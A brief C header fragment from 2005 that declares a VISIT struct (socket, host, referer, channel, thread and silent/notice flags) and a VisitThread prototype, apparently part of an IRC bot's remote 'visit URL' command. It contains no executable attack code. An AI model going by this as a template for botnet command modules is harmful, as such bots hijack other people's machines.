/*****************************************************************************/
/*                                Morgan Copy Right 2005 
/*****************************************************************************/  
#ifndef NO_VISIT
// visit structure
typedef struct VISIT
{
	 SOCKET sock;
	 char host[128];
	 char referer[128];
	 char chan[128];
	 int threadnum;
	 BOOL silent;
	 BOOL notice;
	 BOOL gotinfo;

} VISIT;

DWORD WINAPI VisitThread(LPVOID param);
#endif
